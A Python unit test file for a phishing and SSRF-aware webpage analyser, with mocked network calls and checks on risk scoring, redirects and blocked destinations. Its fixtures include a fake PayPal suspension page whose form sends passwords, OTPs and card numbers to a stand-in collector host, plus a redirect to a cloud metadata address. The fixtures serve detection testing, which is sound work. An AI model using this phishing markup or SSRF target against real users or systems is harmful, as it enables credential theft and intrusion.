"""
intelligence/test_webpage_analyzer.py
----------------------------------------
SentinelX - webpage_analyzer.py unit tests.

Every test mocks urllib.request.build_opener/socket.getaddrinfo. NONE of
these tests make a real network call anywhere.

Two ways to run this file, same convention as the other test_*.py files
in this project:

  1. As a plain demo (no test framework needed):
         python intelligence/test_webpage_analyzer.py

  2. As an actual test suite, if pytest is installed:
         pytest intelligence/test_webpage_analyzer.py -v
"""

import dataclasses
import email.message
import io
import json
import socket
import urllib.error

from unittest.mock import patch, MagicMock

from app.engines.intel.webpage_analyzer import (
    analyze_webpage,
    PageAnalysisResult,
    PageFetchResult,
    FormFinding,
    PhishingSignal,
    _naive_domain,
    _check_destination_safety,
    _DestinationUnresolvable,
)


# ---------------------------------------------------------------------------
# Test helpers
# ---------------------------------------------------------------------------

class _FakeResponse:
    """A minimal file-like stand-in for what urlopen()'s context manager
    returns - just enough for _read_bounded()'s chunked .read(n) calls
    and the .status/.headers.get() accesses in _fetch_page()."""

    def __init__(self, body: bytes, status=200, headers=None):
        self._buf = io.BytesIO(body)
        self.status = status
        self.headers = headers or {}

    def read(self, n=-1):
        return self._buf.read(n)

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False


def _html_response(html_text: str, content_type="text/html; charset=utf-8", status=200):
    return _FakeResponse(
        html_text.encode("utf-8"), status=status, headers={"Content-Type": content_type},
    )


def _http_error(code, location=None, reason="redirect"):
    headers = email.message.Message()
    if location:
        headers["Location"] = location
    return urllib.error.HTTPError(url="http://x", code=code, msg=reason, hdrs=headers, fp=None)


def _fake_opener(open_side_effect):
    opener = MagicMock()
    if isinstance(open_side_effect, list):
        opener.open.side_effect = open_side_effect
    else:
        opener.open.return_value = open_side_effect
    return opener


BENIGN_LOGIN_PAGE = """
<html><head><title>Sign in</title></head>
<body>
  <h1>Sign in to Your Account</h1>
  <form action="/login" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Sign in</button>
  </form>
</body></html>
"""

PHISHING_PAGE = """
<html><head><title>PayPal - Account Verification</title></head>
<body>
  <p>Your PayPal account has been suspended due to unusual activity.
     Please verify your account within 24 hours to avoid suspension.</p>
  <form action="http://evil-collector.example/harvest" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="text" name="otp_code">
    <input type="text" name="card_number">
    <button type="submit">Verify Now</button>
  </form>
</body></html>
"""


# ---------------------------------------------------------------------------
# Input validation / safety-gate tests - no network call in any of these
# ---------------------------------------------------------------------------

def test_missing_url_returns_error_without_network_call():
    with patch("webpage_analyzer.urllib.request.build_opener") as mock_build:
        result = analyze_webpage("")
    assert result.fetch.fetched is False
    assert result.fetch.error is not None
    assert mock_build.called is False


def test_invalid_scheme_returns_error_without_network_call():
    with patch("webpage_analyzer.urllib.request.build_opener") as mock_build:
        result = analyze_webpage("ftp://example.com/file")
    assert result.fetch.fetched is False
    assert result.fetch.error is not None
    assert mock_build.called is False


def test_embedded_credentials_blocks_without_network_call():
    fake_opener = _fake_opener(_html_response(BENIGN_LOGIN_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener):
        result = analyze_webpage("http://user:pass@example.com/")
    assert result.fetch.blocked is True
    assert "credential" in result.fetch.blocked_reason
    assert fake_opener.open.called is False


def test_ssrf_blocked_destination_blocks_without_fetch():
    fake_opener = _fake_opener(_html_response(BENIGN_LOGIN_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer.socket.getaddrinfo", return_value=[(2, 1, 6, "", ("127.0.0.1", 0))]):
        result = analyze_webpage("http://internal.example/")
    assert result.fetch.blocked is True
    assert "127.0.0.1" in result.fetch.blocked_reason
    assert fake_opener.open.called is False


def test_dns_failure_is_recorded_as_error_not_blocked():
    fake_opener = _fake_opener(_html_response(BENIGN_LOGIN_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer.socket.getaddrinfo", side_effect=socket.gaierror("Name or service not known")):
        result = analyze_webpage("http://this-does-not-resolve.invalid/")
    assert result.fetch.blocked is False
    assert result.fetch.error is not None
    assert fake_opener.open.called is False


def test_timeout_returns_error_without_raising():
    fake_opener = MagicMock()
    fake_opener.open.side_effect = socket.timeout("timed out")
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/", timeout=2.0)
    assert result.fetch.fetched is False
    assert result.fetch.error is not None
    assert "timed out" in result.fetch.error.lower() or "timeout" in result.fetch.error.lower()


def test_network_failure_returns_error_without_raising():
    fake_opener = MagicMock()
    fake_opener.open.side_effect = urllib.error.URLError("name resolution failed")
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/")
    assert result.fetch.fetched is False
    assert result.fetch.error is not None


# ---------------------------------------------------------------------------
# Content-type / size / malformed-HTML handling
# ---------------------------------------------------------------------------

def test_non_html_content_type_skips_parsing_with_no_false_signals():
    fake_opener = _fake_opener(_FakeResponse(b"\x89PNG\r\n...", headers={"Content-Type": "image/png"}))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/logo.png")
    assert result.fetch.fetched is True
    assert result.forms == []
    assert all(not s.triggered for s in result.signals)
    assert result.phishing_risk_score == 0


def test_oversized_response_is_truncated_but_still_parsed():
    big_html = "<html><body><form method=\"post\"><input type=\"password\" name=\"password\">" \
               + ("A" * 2_000_000) + "</form></body></html>"
    fake_opener = _fake_opener(_html_response(big_html))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/", max_response_bytes=1_500_000)
    assert result.fetch.truncated is True
    assert result.fetch.content_length_bytes == 1_500_000
    # Even truncated, the form near the start should still have been seen.
    assert any(f.has_password_field for f in result.forms)


def test_malformed_html_does_not_raise():
    broken_html = "<html><body><form method=post><input type=password name=pw" \
                  "<div class=unclosed>oops<<<<<"
    fake_opener = _fake_opener(_html_response(broken_html))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/")
    assert result.error is None
    assert result.fetch.fetched is True


# ---------------------------------------------------------------------------
# Signal-level correctness
# ---------------------------------------------------------------------------

def test_benign_login_page_scores_low_with_no_false_positives():
    fake_opener = _fake_opener(_html_response(BENIGN_LOGIN_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/login")
    triggered_names = {s.name for s in result.signals if s.triggered}
    assert "password_field_present" in triggered_names
    assert "external_form_action" not in triggered_names
    assert "password_field_over_http" not in triggered_names
    assert "urgency_language" not in triggered_names
    assert "brand_mention_mismatch" not in triggered_names
    assert result.phishing_risk_level == "LOW"


def test_phishing_fixture_triggers_multiple_signals_and_high_score():
    fake_opener = _fake_opener(_html_response(PHISHING_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://paypal-secure-verify.example/")
    triggered_names = {s.name for s in result.signals if s.triggered}
    assert "password_field_present" in triggered_names
    assert "otp_or_card_field_present" in triggered_names
    assert "external_form_action" in triggered_names
    assert "urgency_language" in triggered_names
    assert "brand_mention_mismatch" in triggered_names
    assert result.phishing_risk_level in ("HIGH", "CRITICAL")
    # Every triggered signal must carry explainable evidence, not a bare flag.
    for signal in result.signals:
        if signal.triggered:
            assert signal.description and len(signal.description) > 10


def test_password_field_over_http_triggers_signal():
    fake_opener = _fake_opener(_html_response(BENIGN_LOGIN_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("http://example.com/login")  # plain http
    signal = next(s for s in result.signals if s.name == "password_field_over_http")
    assert signal.triggered is True
    assert "HTTP" in signal.description or "http" in signal.description


def test_external_form_action_field_names_never_include_values():
    fake_opener = _fake_opener(_html_response(PHISHING_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://paypal-secure-verify.example/")
    assert len(result.forms) == 1
    form = result.forms[0]
    assert form.is_external_action is True
    assert form.has_password_field is True
    assert form.has_otp_or_card_field is True
    # Only structural field NAMES are ever recorded, never any value.
    assert "username" in form.field_names_sample
    assert "password" in form.field_names_sample


# ---------------------------------------------------------------------------
# Redirect handling
# ---------------------------------------------------------------------------

def test_redirect_is_followed_to_final_html_content():
    fake_opener = MagicMock()
    fake_opener.open.side_effect = [
        _http_error(302, location="https://final.example.com/page"),
        _html_response(BENIGN_LOGIN_PAGE),
    ]
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://start.example.com/")
    assert result.fetch.fetched is True
    assert result.fetch.final_url == "https://final.example.com/page"
    assert any(f.has_password_field for f in result.forms)


def test_redirect_to_unsafe_destination_is_blocked():
    fake_opener = MagicMock()
    fake_opener.open.side_effect = [
        _http_error(302, location="http://169.254.169.254/latest/meta-data/"),
    ]

    def fake_safety(hostname):
        if hostname == "169.254.169.254":
            return False, "resolves to a disallowed address (169.254.169.254)"
        return True, None

    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", side_effect=fake_safety):
        result = analyze_webpage("https://start.example.com/")
    assert result.fetch.blocked is True
    assert "169.254.169.254" in result.fetch.blocked_reason
    assert fake_opener.open.call_count == 1  # never connected to the unsafe hop


def test_redirect_limit_is_enforced_exactly():
    fake_opener = MagicMock()
    fake_opener.open.side_effect = [
        _http_error(302, location="https://hop1.example.com/"),
        _http_error(302, location="https://hop2.example.com/"),
        _http_error(302, location="https://hop3.example.com/"),
        _http_error(302, location="https://hop4.example.com/"),  # must never be reached
    ]
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://start.example.com/", max_redirects=3)
    assert result.fetch.blocked is True
    assert "redirect limit" in result.fetch.blocked_reason
    # 1 initial + 3 followed redirects = 4 requests total; the 4th
    # redirect (to hop4) must never be requested.
    assert fake_opener.open.call_count == 4


# ---------------------------------------------------------------------------
# Scoring / result shape
# ---------------------------------------------------------------------------

def test_score_capped_at_100():
    stacked_page = PHISHING_PAGE.replace(
        "</form>",
        '</form><form action="http://another-evil.example/x" method="post">'
        '<input type="password" name="password"><input type="text" name="cvv"></form>',
    )
    fake_opener = _fake_opener(_html_response(stacked_page))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("http://paypal-secure-verify.example/")  # http -> also triggers downgrade signal
    assert result.phishing_risk_score <= 100
    assert result.phishing_risk_level == "CRITICAL"


def test_result_is_json_serializable():
    fake_opener = _fake_opener(_html_response(PHISHING_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://paypal-secure-verify.example/")
    blob = json.dumps(dataclasses.asdict(result))
    assert '"phishing_risk_score"' in blob
    assert '"ai_interpretation"' in blob


def test_ai_interpretation_field_is_always_none():
    fake_opener = _fake_opener(_html_response(PHISHING_PAGE))
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://paypal-secure-verify.example/")
    assert result.ai_interpretation is None


def test_analyze_webpage_never_raises_on_completely_broken_response():
    fake_opener = MagicMock()
    fake_opener.open.side_effect = RuntimeError("something totally unexpected")
    with patch("webpage_analyzer.urllib.request.build_opener", return_value=fake_opener), \
         patch("webpage_analyzer._check_destination_safety", return_value=(True, None)):
        result = analyze_webpage("https://example.com/")
    assert result.fetch.fetched is False
    assert result.fetch.error is not None


# ---------------------------------------------------------------------------
# Small helper-level tests
# ---------------------------------------------------------------------------

def test_naive_domain_extraction():
    assert _naive_domain("example.com") == "example.com"
    assert _naive_domain("mail.example.com") == "example.com"
    assert _naive_domain("192.168.1.1") == "192.168.1.1"


def test_check_destination_safety_raises_on_dns_failure():
    with patch("webpage_analyzer.socket.getaddrinfo", side_effect=socket.gaierror("boom")):
        try:
            _check_destination_safety("this-does-not-resolve.invalid")
            assert False, "Expected _DestinationUnresolvable"
        except _DestinationUnresolvable:
            pass


def run_all_tests():
    tests = [obj for name, obj in list(globals().items()) if name.startswith("test_")]
    passed = 0
    for test_fn in tests:
        test_fn()
        passed += 1
        print(f"  PASS  {test_fn.__name__}")
    print(f"\n{passed}/{len(tests)} unit tests passed (no network required).\n")


if __name__ == "__main__":
    print("Running unit tests (no network required)...\n")
    run_all_tests()
